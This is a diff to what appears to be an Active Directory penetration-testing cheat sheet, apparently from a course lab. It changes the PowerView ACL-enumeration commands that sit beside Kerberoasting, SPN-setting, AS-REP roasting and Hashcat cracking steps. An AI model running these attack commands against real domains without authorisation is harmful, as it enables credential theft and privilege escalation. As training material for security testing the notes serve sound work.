@@ -165,9 +165,10 @@ python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~
 
 ### Set SPN
 - If we have sufficient permissions (GenericAll/GenericWrite). It is possible to set a SPN and then kerberoast!
-#### Enumerate permissions for group on ACL
+#### Enumerate permissions
 ```
-Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<SAMACCOUNTNAME>"}
+Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN>
+Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectDN, ActiveDirectoryRights, Identityreference
 ```
 
 #### Set SPN for the user
@@ -217,10 +218,10 @@ Hashcat -a 0 -m 18200 hash.txt rockyou.txt
 ### Set pre-auth not required
 - With enough rights (GenericWrite of GenericAll) it is possible to set pre-auth not required.
 
-#### Enumerate permissions for group
+#### Enumerate permissions
 ```
-Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
-Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
+Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN>
+Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectDN, ActiveDirectoryRights, Identityreference
 ```
 
 #### Set preauth not required
